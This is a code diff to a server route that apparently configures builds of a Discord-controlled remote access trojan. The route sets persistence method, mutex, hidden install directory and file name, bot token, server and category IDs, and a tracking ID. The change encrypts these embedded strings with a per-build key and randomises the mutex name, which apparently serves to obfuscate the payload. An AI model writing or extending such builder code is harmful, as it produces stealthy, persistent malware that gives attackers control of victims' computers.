@@ -49,7 +49,7 @@ router.post('/update-config', async (req, res) => {
 
     const cryptoKey = common.genStr(21);
 
-    config.cachedCryptoKey = cryptoKey;
+    crypto.setCryptoKey(cryptoKey);
     console.log('encryption key:', cryptoKey);
 
     try {
@@ -68,22 +68,33 @@ router.post('/update-config', async (req, res) => {
         config = regex.boolCS(config, 'CONTINUE_WITHOUT_ADMIN', body.continue_without_admin);
 
         config = regex.boolCS(config, 'USE_MUTEX', body.use_mutex);
-        config = regex.stringCS(config, 'MUTEX_NAME', body.mutex_name);
+        config = regex.stringCS(config, 'MUTEX_NAME', body.mutex_name
+            ? crypto.encryptString(body.mutex_name)
+            : crypto.encryptString(common.genStr(10))
+        );
 
         config = regex.boolCS(config, 'ADMIN_CUSTOM_PERSISTENCE', body.better_persistence_when_admin);
         config = regex.enumCS(config, 'PERSISTENCE_METHOD', 'PersistMethod', getPersistMethod(body.persistence_method));
 
         config = regex.boolCS(config, 'USE_NEW_DIR', body.use_custom_directory);
-        config = regex.stringCS(config, 'NEW_DIR', body.custom_directory_path);
+        config = regex.stringCS(config, 'NEW_DIR', body.use_custom_directory
+            ? crypto.encryptString(body.custom_directory_path)
+            : ''
+        );
 
         config = regex.boolCS(config, 'USE_NEW_NAME', body.use_custom_name);
-        config = regex.stringCS(config, 'NEW_NAME', body.custom_name);
+        config = regex.stringCS(config, 'NEW_NAME', body.use_custom_name
+            ? crypto.encryptString(body.custom_name)
+            : ''
+        );
 
-        config = regex.stringCS(config, 'BOT_TOKEN', body.bot_token);
-        config = regex.stringCS(config, 'SERVER_ID', body.server_id);
-        config = regex.stringCS(config, 'CATEGORY_ID', body.category_id);
+        config = regex.stringCS(config, 'BOT_TOKEN', crypto.encryptString(body.bot_token));
+        config = regex.stringCS(config, 'SERVER_ID', crypto.encryptString(body.server_id));
+        config = regex.stringCS(config, 'CATEGORY_ID', crypto.encryptString(body.category_id));
 
         config = regex.stringCS(config, 'COMMAND_PREFIX', body.command_prefix);
+
+        config = regex.stringCS(config, 'TRACKING', crypto.encryptString(body.tracking_id));
 
         fs.writeFileSync(configFile, config, 'utf-8');
     } catch(e) {
